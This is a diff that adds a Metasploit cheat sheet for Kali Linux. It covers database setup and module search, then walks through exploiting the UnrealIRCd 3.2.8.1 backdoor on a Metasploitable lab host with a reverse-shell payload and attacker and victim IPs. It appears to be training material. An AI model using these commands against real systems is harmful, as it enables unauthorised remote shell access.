@@ -1,0 +1,65 @@
+##########################
+## METASPLOIT 
+##########################
+
+Metasploit is shipped with Kali Linux.
+All commands are run as root.
+
+# setting the PostgreSql Database:
+systemctl enable postgresql
+systemctl start postgresql
+systemctl status postgresql
+
+# initializing the Database:
+msfdb init
+
+# updating Metasploit:
+apt update && apt install metasploit-framework
+gem update --system
+
+# getting help:
+msfconsole -h
+
+Usage:
+# Use <tab> key multiple times for completion.
+
+# starting msfconsole:
+msfconsole
+
+# showing all exploits:
+msf6> show exploits
+
+# viewing productivity tips & tricks:
+msf6> tip -l
+
+# searching for a string (module, exploit ...):
+msf6> search ssh
+msf6> search windows
+msf6> search platform:windows name:sql type:exploit
+msf6> help search
+
+# getting info about an exploit:
+msf6> info exploit/windows/postgres/postgres_payload
+
+# selecting an exploit:
+msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) >
+
+# setting a payload (reverse shell)
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse
+payload => cmd/unix/reverse
+
+# displaying all options of the exploit:
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show options
+
+# setting the options:
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 10.0.0.2     # this is metasploit IP
+LHOST => 10.0.0.2
+
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOST 10.0.0.1     # this is victim's (metasploitable) IP
+RHOST => 10.0.0.1
+
+
+# launching the exploit:
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit  #alias to run
+
